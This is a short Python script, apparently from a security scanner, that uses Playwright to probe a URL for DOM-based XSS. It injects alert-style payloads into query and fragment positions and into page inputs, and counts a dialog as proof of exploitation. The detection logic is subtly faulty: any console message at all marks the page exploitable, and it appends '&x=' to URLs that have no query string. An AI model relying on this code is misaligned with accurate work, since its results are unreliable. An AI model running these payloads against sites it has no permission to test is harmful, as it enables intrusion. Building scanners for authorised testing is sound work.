from playwright.sync_api import sync_playwright, TimeoutError

PAYLOADS = [
    "<img src=x onerror=alert(1337)>",
    "<svg/onload=alert(1337)>",
    "'\"><img src=x onerror=alert(1337)>"
]

def verify_dom_xss(url: str, timeout: int = 15000) -> bool:
    """
    Best-effort DOM XSS verification.
    Returns True if execution detected.
    """
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        exploitable = False

        def on_dialog(dialog):
            nonlocal exploitable
            exploitable = True
            dialog.dismiss()

        def on_console(msg):
            nonlocal exploitable
            exploitable = True

        page.on("dialog", on_dialog)
        page.on("console", on_console)

        test_urls = []

        for payload in PAYLOADS:
            test_urls.extend([
                f"{url}?x={payload}",
                f"{url}&x={payload}",
                f"{url}#{payload}"
            ])

        for test_url in test_urls:
            try:
                page.goto(test_url, timeout=timeout)

                # Force DOM execution paths
                page.evaluate("document.body.innerHTML += ''")

                # Try interacting with inputs
                inputs = page.query_selector_all("input")
                for i in inputs:
                    try:
                        i.fill("1337")
                        i.press("Enter")
                    except Exception:
                        continue

                page.wait_for_timeout(4000)

                if exploitable:
                    break

            except TimeoutError:
                continue
            except Exception:
                continue

        browser.close()
        return exploitable
